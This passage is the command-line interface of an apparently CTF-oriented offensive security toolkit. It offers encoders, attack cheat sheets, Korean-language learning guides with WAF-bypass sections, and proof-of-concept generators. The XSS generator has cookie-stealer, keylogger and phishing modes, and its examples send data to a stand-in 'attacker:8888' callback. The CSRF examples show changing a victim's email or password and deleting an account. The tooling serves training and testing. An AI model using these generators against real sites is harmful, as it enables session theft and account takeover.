def encode_url(input_text, decode, double):
    """URL encode/decode."""
    if decode:
        result = Encoder.url_decode(input_text)
    elif double:
        result = Encoder.double_url_encode(input_text)
    else:
        result = Encoder.url_encode(input_text)
    console.print(result)


@encode.command("hex")
@click.option("--input", "-i", "input_text", required=True, help="Input string")
@click.option("--decode", "-d", is_flag=True, help="Decode instead of encode")
@click.option("--sql", is_flag=True, help="SQL hex format (0x...)")
def encode_hex(input_text, decode, sql):
    """Hex encode/decode."""
    if decode:
        result = Encoder.hex_decode(input_text)
    elif sql:
        result = Encoder.hex_encode_sql(input_text)
    else:
        result = Encoder.hex_encode(input_text)
    console.print(result)


@encode.command("all")
@click.option("--input", "-i", "input_text", required=True, help="Input string")
def encode_all(input_text):
    """Show all encodings for input."""
    encodings = Encoder.encode_all(input_text)

    table = Table(title="All Encodings")
    table.add_column("Type", style="cyan")
    table.add_column("Result", style="yellow")

    for enc_type, result in encodings.items():
        table.add_row(enc_type, result)

    console.print(table)


# ==================== Cheat Commands ====================

@cli.group()
def cheat():
    """Display cheat sheets.

    Available: sqli, xss, cmdi, ssrf, xxe, lfi, ssti
    """
    pass


def print_cheatsheet(cheatsheet: dict, filter_keyword: Optional[str] = None):
    """Print a cheatsheet in a nice format."""
    console.print(Panel(f"[bold cyan]{cheatsheet['title']}[/bold cyan]"))

    for cat_name, cat_data in cheatsheet["categories"].items():
        console.print(f"\n[bold green]{cat_data['title']}[/bold green]")
        console.print(f"[dim]{cat_data['description']}[/dim]\n")

        table = Table(show_header=True, header_style="bold")
        table.add_column("Payload", style="yellow")
        table.add_column("Description", style="cyan")

        for p in cat_data["payloads"]:
            table.add_row(p["payload"], p["description"])

        console.print(table)


@cheat.command("sqli")
@click.option("--filter", "-f", "filter_keyword", help="Filter by keyword")
@click.option("--category", "-c", help="Show specific category")
def cheat_sqli(filter_keyword, category):
    """SQL Injection cheat sheet."""
    from .cheatsheets.sqli import get_cheatsheet
    cs = get_cheatsheet(category=category, filter_keyword=filter_keyword)
    print_cheatsheet(cs, filter_keyword)


@cheat.command("xss")
@click.option("--filter", "-f", "filter_keyword", help="Filter by keyword")
@click.option("--category", "-c", help="Show specific category")
def cheat_xss(filter_keyword, category):
    """XSS cheat sheet."""
    from .cheatsheets.xss import get_cheatsheet
    cs = get_cheatsheet(category=category, filter_keyword=filter_keyword)
    print_cheatsheet(cs, filter_keyword)


@cheat.command("cmdi")
@click.option("--filter", "-f", "filter_keyword", help="Filter by keyword")
@click.option("--category", "-c", help="Show specific category")
def cheat_cmdi(filter_keyword, category):
    """Command Injection cheat sheet."""
    from .cheatsheets.cmdi import get_cheatsheet
    cs = get_cheatsheet(category=category, filter_keyword=filter_keyword)
    print_cheatsheet(cs, filter_keyword)


@cheat.command("ssrf")
@click.option("--filter", "-f", "filter_keyword", help="Filter by keyword")
@click.option("--category", "-c", help="Show specific category")
def cheat_ssrf(filter_keyword, category):
    """SSRF (Server-Side Request Forgery) cheat sheet."""
    from .cheatsheets.ssrf import get_cheatsheet
    cs = get_cheatsheet(category=category, filter_keyword=filter_keyword)
    print_cheatsheet(cs, filter_keyword)


@cheat.command("xxe")
@click.option("--filter", "-f", "filter_keyword", help="Filter by keyword")
@click.option("--category", "-c", help="Show specific category")
def cheat_xxe(filter_keyword, category):
    """XXE (XML External Entity) cheat sheet."""
    from .cheatsheets.xxe import get_cheatsheet
    cs = get_cheatsheet(category=category, filter_keyword=filter_keyword)
    print_cheatsheet(cs, filter_keyword)


@cheat.command("lfi")
@click.option("--filter", "-f", "filter_keyword", help="Filter by keyword")
@click.option("--category", "-c", help="Show specific category")
def cheat_lfi(filter_keyword, category):
    """LFI (Local File Inclusion) cheat sheet."""
    from .cheatsheets.lfi import get_cheatsheet
    cs = get_cheatsheet(category=category, filter_keyword=filter_keyword)
    print_cheatsheet(cs, filter_keyword)


@cheat.command("ssti")
@click.option("--filter", "-f", "filter_keyword", help="Filter by keyword")
@click.option("--category", "-c", help="Show specific category")
def cheat_ssti(filter_keyword, category):
    """SSTI (Server-Side Template Injection) cheat sheet."""
    from .cheatsheets.ssti import get_cheatsheet
    cs = get_cheatsheet(category=category, filter_keyword=filter_keyword)
    print_cheatsheet(cs, filter_keyword)


@cheat.command("all")
def cheat_all():
    """Show all cheat sheets."""
    cheat_sqli.callback(None, None)
    cheat_xss.callback(None, None)
    cheat_cmdi.callback(None, None)
    cheat_ssrf.callback(None, None)
    cheat_xxe.callback(None, None)
    cheat_lfi.callback(None, None)
    cheat_ssti.callback(None, None)


# ==================== Learn Commands ====================

@cli.group()
def learn():
    """학습 가이드 및 체크리스트.

    공격 유형별 학습 자료, 체크리스트, 탐지 패턴을 제공합니다.

    Available: sqli, xss, cmdi, ssrf, xxe, lfi, ssti
    """
    pass


@learn.command("overview")
def learn_overview():
    """전체 가이드 목록 보기."""
    guides = list_all_guides()
    render_overview_list(guides)


@learn.command("guide")
@click.argument("attack_type")
@click.option("--technique", "-t", help="특정 기술만 보기 (예: union_based, error_based)")
@click.option("--section", "-s", type=click.Choice(["overview", "techniques", "waf-bypass", "ctf-tips"]), help="특정 섹션만 보기")
@click.option("--difficulty", "-d", type=click.Choice(["beginner", "intermediate", "advanced"]), help="난이도 필터")
def learn_guide(attack_type, technique, section, difficulty):
    """공격 유형별 전체 가이드 조회.

    ATTACK_TYPE: sqli, xss, cmdi, ssrf, xxe, lfi, ssti
    """
    attack_type = resolve_attack_type(attack_type)
    guide = get_guide(attack_type)

    if not guide:
        log_error(f"가이드를 찾을 수 없습니다: {attack_type}")
        log_info(f"사용 가능한 가이드: {', '.join(get_available_guides())}")
        return

    # Section-specific rendering
    if section == "overview":
        render_guide_overview(guide)
    elif section == "techniques":
        techniques = get_techniques(attack_type, technique=technique, difficulty=difficulty)
        if techniques:
            if technique:
                render_technique(technique, techniques)
            else:
                render_techniques(techniques)
        else:
            log_warning("해당하는 기술을 찾을 수 없습니다.")
    elif section == "waf-bypass":
        bypasses = get_waf_bypass(attack_type)
        if bypasses:
            render_waf_bypass(bypasses, attack_type)
        else:
            log_warning("WAF 우회 정보가 없습니다.")
    elif section == "ctf-tips":
        tips = get_ctf_tips(attack_type)
        if tips:
            render_ctf_tips(tips, attack_type)
        else:
            log_warning("CTF 팁이 없습니다.")
    else:
        # Full guide
        render_guide_overview(guide)

        if technique:
            tech = get_techniques(attack_type, technique=technique)
            if tech:
                render_technique(technique, tech)
        elif difficulty:
            techniques = get_techniques(attack_type, difficulty=difficulty)
            if techniques:
                render_techniques(techniques, title=f"Techniques ({difficulty})")
        else:
            techniques = guide.get("techniques", {})
            if techniques:
                render_techniques(techniques)

        bypasses = get_waf_bypass(attack_type)
        if bypasses:
            render_waf_bypass(bypasses, attack_type)

        tips = get_ctf_tips(attack_type)
        if tips:
            render_ctf_tips(tips, attack_type)


@learn.command("checklist")
@click.argument("attack_type")
@click.option("--interactive", "-i", is_flag=True, help="인터랙티브 모드 (진행 상황 추적)")
@click.option("--export", "-e", "export_path", help="마크다운 파일로 내보내기")
def learn_checklist(attack_type, interactive, export_path):
    """공격 유형별 체크리스트 조회.

    ATTACK_TYPE: sqli, xss, cmdi, ssrf, xxe, lfi, ssti
    """
    attack_type = resolve_attack_type(attack_type)
    checklist = get_checklist(attack_type)

    if not checklist:
        log_error(f"체크리스트를 찾을 수 없습니다: {attack_type}")
        log_info(f"사용 가능한 가이드: {', '.join(get_available_guides())}")
        return

    if export_path:
        export_checklist_markdown(checklist, attack_type, export_path)
    elif interactive:
        render_interactive_checklist(checklist, attack_type)
    else:
        render_checklist(checklist, attack_type)


@learn.command("detect")
@click.argument("attack_type")
@click.option("--db-type", type=click.Choice(["mysql", "mssql", "oracle", "postgresql", "sqlite"]), help="DB 타입 필터 (SQLi 전용)")
@click.option("--show-examples", is_flag=True, help="예시 응답 포함")
def learn_detect(attack_type, db_type, show_examples):
    """취약점 탐지 패턴 조회.

    ATTACK_TYPE: sqli, xss, cmdi, ssrf, xxe, lfi, ssti
    """
    attack_type = resolve_attack_type(attack_type)
    patterns = get_detection_patterns(attack_type, db_type=db_type, show_examples=show_examples)

    if not patterns:
        log_error(f"탐지 패턴을 찾을 수 없습니다: {attack_type}")
        log_info(f"사용 가능한 가이드: {', '.join(get_available_guides())}")
        return

    render_detection_patterns(patterns, attack_type, show_examples=show_examples)


@learn.command("quick")
@click.argument("attack_type")
def learn_quick(attack_type):
    """퀵 레퍼런스 카드 (핵심 요약).

    ATTACK_TYPE: sqli, xss, cmdi, ssrf, xxe, lfi, ssti

    한 화면에 핵심 페이로드, 탐지 패턴, CTF 팁을 요약합니다.
    """
    attack_type = resolve_attack_type(attack_type)
    quick_ref = get_quick_reference(attack_type)

    if not quick_ref:
        log_error(f"가이드를 찾을 수 없습니다: {attack_type}")
        log_info(f"사용 가능한 가이드: {', '.join(get_available_guides())}")
        return

    render_quick_reference(quick_ref)


# ==================== Shortcut Commands ====================

@cli.command("guide")
@click.argument("attack_type")
@click.option("--technique", "-t", help="특정 기술만 보기")
@click.option("--difficulty", "-d", type=click.Choice(["beginner", "intermediate", "advanced"]), help="난이도 필터")
@click.pass_context
def guide_shortcut(ctx, attack_type, technique, difficulty):
    """[단축] 공격 가이드 조회 (learn guide 단축)."""
    ctx.invoke(learn_guide, attack_type=attack_type, technique=technique, section=None, difficulty=difficulty)


@cli.command("checklist")
@click.argument("attack_type")
@click.option("--interactive", "-i", is_flag=True, help="인터랙티브 모드")
@click.pass_context
def checklist_shortcut(ctx, attack_type, interactive):
    """[단축] 체크리스트 조회 (learn checklist 단축)."""
    ctx.invoke(learn_checklist, attack_type=attack_type, interactive=interactive, export_path=None)


@cli.command("quick")
@click.argument("attack_type")
@click.pass_context
def quick_shortcut(ctx, attack_type):
    """[단축] 퀵 레퍼런스 카드 (learn quick 단축)."""
    ctx.invoke(learn_quick, attack_type=attack_type)


# Bruteforce shortcut alias
cli.add_command(bruteforce, name="bf")


# ==================== Flag Commands ====================

@cli.command()
@click.option("--text", "-t", help="Search in text string")
@click.option("--file", "-f", "filepath", type=click.Path(exists=True), help="Search in file")
@click.option("--pattern", "-p", help="Custom regex pattern")
@click.option("--highlight", is_flag=True, help="Highlight flags in output")
def flag(text, filepath, pattern, highlight):
    """Extract CTF flags from text or file."""
    extractor = FlagExtractor()

    if pattern:
        extractor.add_pattern(pattern)

    if filepath:
        with open(filepath, "r", encoding="utf-8", errors="ignore") as f:
            text = f.read()

    if not text:
        log_error("No input provided. Use --text or --file")
        return

    flags = extractor.extract(text)

    if flags:
        print_section("FLAGS FOUND")
        for f in flags:
            log_flag(f)

        if highlight:
            console.print("\n[bold]Highlighted text:[/bold]")
            highlighted = extractor.highlight_flags(text)
            console.print(highlighted)
    else:
        log_warning("No flags found")




# ==================== PoC Generator Commands ====================

@cli.group()
def poc():
    """Generate Proof of Concept exploits for CTF.
    
    Create standalone HTML files, curl commands, and Python scripts
    for demonstrating vulnerabilities.
    
    Available: xss, csrf, sqli
    """
    pass


@poc.command("xss")
@click.option("--url", "-u", required=True, help="Target URL")
@click.option("--param", "-p", required=True, help="Vulnerable parameter")
@click.option("--type", "-t", "poc_type", default="alert", 
              type=click.Choice(["alert", "cookie_stealer", "keylogger", "phishing", "redirect", "defacement"]),
              help="Type of XSS PoC")
@click.option("--callback", "-c", help="Callback URL for exfiltration (required for cookie_stealer/keylogger)")
@click.option("--method", "-m", default="img", 
              type=click.Choice(["img", "fetch", "xhr", "img_onerror", "svg", "basic", "document_domain"]),
              help="Exfiltration or alert method")
@click.option("--encoding", "-e", default="none",
              type=click.Choice(["none", "url", "double_url", "base64", "html"]),
              help="Payload encoding")
@click.option("--output-dir", "-o", default=".", help="Output directory for PoC files")
@click.option("--no-html", is_flag=True, help="Don't generate HTML file")
@pass_config
def poc_xss(config, url, param, poc_type, callback, method, encoding, output_dir, no_html):
    """Generate XSS Proof of Concept.
    
    Examples:
    
        # Simple alert PoC
        ctf-toolkit poc xss -u "http://target/?name=test" -p name
        
        # Cookie stealer with callback
        ctf-toolkit poc xss -u "http://target/?name=test" -p name -t cookie_stealer -c "http://attacker:8888/"
        
        # Keylogger
        ctf-toolkit poc xss -u "http://target/?name=test" -p name -t keylogger -c "http://attacker:8888/"
    """
    from .exploits import XssPocGenerator
    
    print_banner()
    log_info(f"Target: {url}")
    log_info(f"Parameter: {param}")
    log_info(f"PoC Type: {poc_type}")
    
    if poc_type in ["cookie_stealer", "keylogger"] and not callback:
        log_error("Callback URL is required for cookie_stealer and keylogger")
        log_info("Use: --callback http://your-server:port/")
        return
    
    generator = XssPocGenerator(target_url=url, param=param, method="GET")
    
    try:
        result = generator.generate(
            poc_type=poc_type,
            callback_url=callback,
            exfil_method=method,
            output_dir=output_dir,
            save_html=not no_html,
            encoding=encoding,
        )
        
        print_section("XSS PoC GENERATED")
        
        console.print(f"[cyan]Payload:[/cyan]")
        console.print(Panel(result.payload, title="Payload", border_style="yellow"))
        
        console.print(f"\n[cyan]Exploit URL:[/cyan]")
        exploit_url = generator.build_url_with_payload(result.payload)
        console.print(f"[yellow]{exploit_url}[/yellow]")
        
        console.print(f"\n[cyan]cURL Command:[/cyan]")
        console.print(f"[dim]{result.curl_command}[/dim]")
        
        if result.html_file:
            console.print(f"\n[green]HTML PoC saved to:[/green] {result.html_file}")
        
        console.print(f"\n[cyan]Evidence:[/cyan]")
        console.print(result.evidence_description)
        
        console.print(f"\n[cyan]Steps to Reproduce:[/cyan]")
        for i, step in enumerate(result.steps_to_reproduce, 1):
            console.print(f"  {i}. {step}")
        
        log_success("PoC generation complete!")
        
    except Exception as e:
        log_error(f"Failed to generate PoC: {e}")


@poc.command("csrf")
@click.option("--url", "-u", required=True, help="Target action URL")
@click.option("--method", "-m", default="POST", type=click.Choice(["GET", "POST"]), help="HTTP method")
@click.option("--data", "-d", help="Form data (key=value&key2=value2)")
@click.option("--json-data", "-j", help="JSON data")
@click.option("--description", help="Description of the malicious action")
@click.option("--button-text", default="Click Me!", help="Button text for manual form")
@click.option("--output-dir", "-o", default=".", help="Output directory for PoC files")
@click.option("--no-html", is_flag=True, help="Don't generate HTML file")
@pass_config
def poc_csrf(config, url, method, data, json_data, description, button_text, output_dir, no_html):
    """Generate CSRF Proof of Concept.
    
    Examples:
    
        # POST form CSRF
        ctf-toolkit poc csrf -u "http://target/change-email" -d "email=attacker@evil.com"
        
        # Change password CSRF
        ctf-toolkit poc csrf -u "http://target/change-password" -d "new_password=hacked123" --description "Change victim password"
        
        # GET-based CSRF
        ctf-toolkit poc csrf -u "http://target/delete-account" -m GET --description "Delete account"
    """
    from .exploits import CsrfPocGenerator
    
    print_banner()
    log_info(f"Target: {url}")
    log_info(f"Method: {method}")
    
    # Parse data
    params = {}
    if data:
        for pair in data.split("&"):
            if "=" in pair:
                key, value = pair.split("=", 1)
                params[key] = value
    elif json_data:
        import json
        params = json.loads(json_data)
    
    log_info(f"Parameters: {params}")
    
    generator = CsrfPocGenerator(target_url=url, method=method, data=params)
    
    try:
        result = generator.generate(
            action_url=url,
            params=params,
            action_description=description or "Perform malicious action",
            button_text=button_text,
            content_type="application/json" if json_data else "application/x-www-form-urlencoded",
            output_dir=output_dir,
            save_html=not no_html,
        )
        
        print_section("CSRF PoC GENERATED")
        
        console.print(f"[cyan]Auto-Submit Form:[/cyan]")
        console.print(Panel(result.payload, title="HTML Payload", border_style="yellow"))
        
        console.print(f"\n[cyan]cURL Command:[/cyan]")
        console.print(f"[dim]{result.curl_command}[/dim]")
        
        if result.html_file:
            console.print(f"\n[green]HTML PoC saved to:[/green] {result.html_file}")
        
        console.print(f"\n[cyan]Evidence:[/cyan]")
        console.print(result.evidence_description)
        
        console.print(f"\n[cyan]Steps to Reproduce:[/cyan]")
        for i, step in enumerate(result.steps_to_reproduce, 1):
            console.print(f"  {i}. {step}")
        
        log_success("PoC generation complete!")
        
    except Exception as e:
        log_error(f"Failed to generate PoC: {e}")


@poc.command("sqli")
@click.option("--url", "-u", required=True, help="Target URL")
@click.option("--param", "-p", required=True, help="Vulnerable parameter")
@click.option("--method", "-m", default="GET", type=click.Choice(["GET", "POST"]), help="HTTP method")
@click.option("--type", "-t", "injection_type", default="union",
              type=click.Choice(["union", "error", "time", "boolean", "auth_bypass"]),
              help="Type of SQL injection")
@click.option("--db", "-D", "db_type", default="mysql",
              type=click.Choice(["mysql", "mssql", "postgresql", "oracle"]),
              help="Database type")
@click.option("--columns", "-c", default=3, type=int, help="Number of columns for UNION injection")
@click.option("--payload", help="Custom payload to use")
@click.option("--output-dir", "-o", default=".", help="Output directory for PoC files")
@click.option("--no-html", is_flag=True, help="Don't generate HTML file")
@pass_config
def poc_sqli(config, url, param, method, injection_type, db_type, columns, payload, output_dir, no_html):
    """Generate SQLi Proof of Concept.
    
    Examples:
    
        # UNION-based injection
        ctf-toolkit poc sqli -u "http://target/?id=1" -p id
        
        # Auth bypass
        ctf-toolkit poc sqli -u "http://target/login" -p username -t auth_bypass
        
        # Time-based blind
        ctf-toolkit poc sqli -u "http://target/?id=1" -p id -t time -D mysql
        
        # Custom payload
        ctf-toolkit poc sqli -u "http://target/?id=1" -p id --payload "' UNION SELECT 1,2,3--"
    """
    from .exploits import SqliPocGenerator
    
    print_banner()
    log_info(f"Target: {url}")
    log_info(f"Parameter: {param}")
    log_info(f"Injection Type: {injection_type}")
    log_info(f"Database: {db_type}")
    
    generator = SqliPocGenerator(target_url=url, param=param, method=method, db_type=db_type)
    
    try:
        result = generator.generate(
            injection_type=injection_type,
            payload=payload,
            num_columns=columns,
            output_dir=output_dir,
            save_html=not no_html,
        )
        
        print_section("SQLi PoC GENERATED")
        
        console.print(f"[cyan]Payload:[/cyan]")
        console.print(Panel(result.payload, title="SQL Payload", border_style="yellow"))
        
        console.print(f"\n[cyan]Exploit URL:[/cyan]")
        exploit_url = generator.build_url_with_payload(result.payload)
        console.print(f"[yellow]{exploit_url}[/yellow]")
        
        console.print(f"\n[cyan]cURL Command:[/cyan]")
        console.print(f"[dim]{result.curl_command}[/dim]")
        
        if result.html_file:
            console.print(f"\n[green]HTML PoC saved to:[/green] {result.html_file}")
        
        # Show enumeration payloads for UNION injection
        if injection_type == "union":
            console.print(f"\n[cyan]Enumeration Payloads:[/cyan]")
            enum_payloads = generator.get_enumeration_payloads(columns)
            table = Table(title="Database Enumeration")
            table.add_column("Target", style="cyan")
            table.add_column("Payload", style="yellow")
            
            for name, p in enum_payloads.items():
                table.add_row(name.title(), p[:60] + "..." if len(p) > 60 else p)
            
            console.print(table)
        
        console.print(f"\n[cyan]Evidence:[/cyan]")
        console.print(result.evidence_description)
        
        console.print(f"\n[cyan]Steps to Reproduce:[/cyan]")
        for i, step in enumerate(result.steps_to_reproduce, 1):
            console.print(f"  {i}. {step}")
        
        log_success("PoC generation complete!")
        
    except Exception as e:
        log_error(f"Failed to generate PoC: {e}")


@poc.command("report")
@click.option("--input", "-i", "input_file", required=True, type=click.Path(exists=True), 
              help="Input scan results file (JSON)")
@click.option("--output", "-o", default="poc_report", help="Output filename (without extension)")
@click.option("--format", "-f", "output_format", default="html",
              type=click.Choice(["html", "markdown", "pdf"]), help="Output format")
@click.option("--output-dir", default=".", help="Output directory")
@pass_config
def poc_report(config, input_file, output, output_format, output_dir):
    """Generate comprehensive PoC report from scan results.
    
    Takes scan results JSON and generates detailed PoC report with
    all payloads, evidence, and reproduction steps.
    
    Examples:
    
        ctf-toolkit poc report -i scan_results.json -o vulnerability_report
        
        ctf-toolkit poc report -i scan_results.json -f markdown -o report
    """
    import json
    from pathlib import Path
    from datetime import datetime
    
    print_banner()
    log_info(f"Reading scan results from: {input_file}")
    
    with open(input_file, "r") as f:
        scan_data = json.load(f)
    
    vulnerabilities = scan_data.get("vulnerabilities", [])
    target_url = scan_data.get("target_url", "Unknown")
    
    log_info(f"Found {len(vulnerabilities)} vulnerabilities")
    
    if output_format == "html":
        # Generate HTML report
        html_content = f"""<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>Vulnerability PoC Report</title>
    <style>
        body {{ font-family: Arial, sans-serif; margin: 40px; background: #1a1a2e; color: #eee; }}
        .container {{ max-width: 1000px; margin: 0 auto; }}
        h1 {{ color: #e94560; }}
        h2 {{ color: #4cc9f0; border-bottom: 1px solid #333; padding-bottom: 10px; }}
        .vuln {{ background: #16213e; padding: 20px; border-radius: 8px; margin: 20px 0; }}
        .payload {{ background: #0f3460; padding: 15px; border-radius: 4px; font-family: monospace; }}
        .high {{ border-left: 4px solid #e94560; }}
        .medium {{ border-left: 4px solid #ffd93d; }}
        .low {{ border-left: 4px solid #4cc9f0; }}
        table {{ width: 100%; border-collapse: collapse; }}
        th, td {{ padding: 10px; text-align: left; border: 1px solid #333; }}
    </style>
</head>
<body>
    <div class="container">
        <h1>Vulnerability PoC Report</h1>
        <p><strong>Target:</strong> {target_url}</p>
        <p><strong>Generated:</strong> {datetime.now().isoformat()}</p>
        <p><strong>Total Vulnerabilities:</strong> {len(vulnerabilities)}</p>
        
        <h2>Vulnerabilities</h2>
"""
        for i, vuln in enumerate(vulnerabilities, 1):
            confidence = vuln.get("confidence", "medium")
            html_content += f"""
        <div class="vuln {confidence}">
            <h3>#{i} - {vuln.get('type', 'Unknown')}</h3>
            <table>
                <tr><th>Confidence</th><td>{confidence.upper()}</td></tr>
                <tr><th>Parameter</th><td>{vuln.get('parameter', 'N/A')}</td></tr>
            </table>
            <h4>Payload</h4>
            <div class="payload">{vuln.get('payload', 'N/A')}</div>
            <h4>Evidence</h4>
            <p>{vuln.get('evidence', 'N/A')}</p>
        </div>
"""
        html_content += """
    </div>
</body>
</html>
"""
        output_path = Path(output_dir) / f"{output}.html"
        output_path.write_text(html_content)
        log_success(f"Report saved to: {output_path}")
        
    elif output_format == "markdown":
        md_content = f"""# Vulnerability PoC Report

**Target:** {target_url}  
**Generated:** {datetime.now().isoformat()}  
**Total Vulnerabilities:** {len(vulnerabilities)}

---

## Vulnerabilities

"""
        for i, vuln in enumerate(vulnerabilities, 1):
            md_content += f"""### #{i} - {vuln.get('type', 'Unknown')}

- **Confidence:** {vuln.get('confidence', 'N/A').upper()}
- **Parameter:** {vuln.get('parameter', 'N/A')}

**Payload:**
```
{vuln.get('payload', 'N/A')}
```

**Evidence:**
{vuln.get('evidence', 'N/A')}

---

"""
        output_path = Path(output_dir) / f"{output}.md"
        output_path.write_text(md_content)
        log_success(f"Report saved to: {output_path}")
    
    else:
        log_error("PDF format not yet implemented")


# ==================== Main ====================

def main():
    """Main entry point."""
    cli()


if __name__ == "__main__":
    main()
